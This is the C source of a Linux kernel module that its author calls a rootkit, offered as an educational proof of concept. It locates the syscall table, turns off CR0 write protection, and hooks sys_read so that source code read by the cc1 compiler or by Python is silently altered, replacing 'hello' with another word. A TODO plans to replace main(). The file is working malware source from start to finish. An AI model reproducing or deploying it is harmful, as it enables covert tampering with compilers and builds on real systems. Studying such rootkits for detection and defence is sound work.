/*
 * I don't know what I'm doing. Let me just put that out there.
 * I'm trying to learn more about the kernel, I guess.
 * This work is based on similar POC kernel modules I've seen 
 * on Github and in 2600 Magazine.
 * 
 * So, I'd like to say "thank you" to all the people who have done the hard work for me.
 *
 * This module should only be used for educational
 * purposes.
 * 
 * - Ian Shannon 
 * */

#include <linux/module.h>   /* For modules */
#include <linux/kernel.h>   /* Helper functions like printk */
#include <linux/syscalls.h> /* The syscall table and __NR_<syscall_name> helpers */
#include <asm/paravirt.h>   /* Read_cr0, write_cr0 */
#include <linux/slab.h>     /* Current task_struct */
#include <asm/uaccess.h>    /* copy_from_user, copy_to_user */

/* The sys_call_table is const so we point this variable to it to get
 * around that
 * */
unsigned long **sys_call_table;

/* Control Register - Determines whether memory is protected.
 * We need to modify it.
 * */
unsigned long original_cr0;

/* Prototypes */
static void tamper_code(char **buffer, size_t byte_count);

/* Function pointer for the read syscall. We keep the original here before
 * swapping it out.
 * */
asmlinkage long (*ref_sys_read) (unsigned int fd, char __user *buffer, size_t count);

/* The rootkit's malicious read function */
asmlinkage long 
rk_sys_read(unsigned int fd, 
            char __user *buffer, 
            size_t count)
{
    /* Exec the original read call, keeping the return value */
    long returnValue;
    char *kernel_buffer;

    returnValue = ref_sys_read(fd, buffer, count);
    if(returnValue >= 6 && fd > 2) {
        /* Current task */
        if(strncmp(current->comm, "cc1",    3) == 0 || 
           strncmp(current->comm, "python", 5) == 0) {
            printk("[*] He's compiling, again.\n");

            if(count > PAGE_SIZE) {
                printk("[!] Rootkit is not allocating %lx Bytes (PAGE_SIZE: %lx B)\n", count, PAGE_SIZE);
                return returnValue;
            }

            kernel_buffer = kmalloc(count, GFP_KERNEL);
            if(!kernel_buffer) {
                printk("[!] Rootkit failed to allocate %lx Bytes!\n", count);
                return returnValue;
            }

            if(copy_from_user(kernel_buffer, buffer, count)) {
                printk("[!] Rootkit failed to copy the read buffer!\n");
                kfree(kernel_buffer);
                return returnValue;
            }

            /* Do bad things */
            printk("[*] Original code:\n%s\n", kernel_buffer);
            tamper_code(&kernel_buffer, count);

            /* Copy the buffer back to the user-space */
            if(copy_to_user(buffer, kernel_buffer, returnValue))
                printk("[!] Rootkit failed to copy the read buffer back to user-space\n");
            kfree(kernel_buffer);
        }
    }

    return returnValue;
}

/* The code that actually swaps out the legit
 * syscall table with our modified function.
 * */
static unsigned long **
get_syscall_table(void)
{
    /* PAGE_OFFSET tells us where kernel memory
     * begins.
     * */
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;
    printk("[*] Starting syscall table scan from: %lx\n", offset);
    while(offset < ULLONG_MAX) {
        /* Cast starting offset to match syscall table's type */
        sct = (unsigned long **) offset;
        if(sct[__NR_close] == (unsigned long *) sys_close) {
            printk("[*] Syscall table found at %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
}

/* 
 * tamper_data: This is the heart of the kernel module. 
 *   At this point, the only thing this function does
 *   is replace characters in the code. Specifically,
 *   it replaces "[Hh]ello" with "fakku".  
 *              
 * TODO: Find and replace main() */
static void 
tamper_code(char **buffer, 
            size_t byte_count)
{
    unsigned i;
    for(i=0; i <  byte_count - 5; ++i) {
        if(((*buffer)[i] == 'H' || (*buffer)[i] == 'h') &&
            (*buffer)[i+1] == 'e' &&
            (*buffer)[i+2] == 'l' &&
            (*buffer)[i+3] == 'l' &&
            (*buffer)[i+4] == 'o') {
                (*buffer)[i] = 'f';
                (*buffer)[i+1] = 'a';
                (*buffer)[i+2] = 'k';
                (*buffer)[i+3] = 'k';
                (*buffer)[i+4] = 'u';
        }
    }
}

/* Entry into module */
static int __init 
rk_start(void)
{
    printk("[*] GCC/Python Rootkit starting.\n");
    if(!(sys_call_table = get_syscall_table()))
        return -1;

    /* Record initial value of cr0 */
    original_cr0 = read_cr0();

    /* Set cr0 to turn off write protection */
    write_cr0(original_cr0 & ~0x00010000);

    /* Copy the old sys_read call */
    ref_sys_read = (void *) sys_call_table[__NR_read];

    /* Write our modified sys_read to the table */
    sys_call_table[__NR_read] = (unsigned long *) rk_sys_read;

    /* Turn write protection back on ;) */
    write_cr0(original_cr0);

    return 0;
}

/* Exit from module */
static void __exit 
rk_end(void)
{
    printk("[*] GCC/Python Rootkit stopping.\n");

    if(!sys_call_table)
        return;

    /* Turn off memory protection */
    write_cr0(original_cr0 & ~0x00010000);
    /* Put old syscall back in place */
    sys_call_table[__NR_read] = (unsigned long *) ref_sys_read;
    /* Turn on memory protection */
    write_cr0(original_cr0);
}

module_init(rk_start);
module_exit(rk_end);

MODULE_LICENSE("GPL");
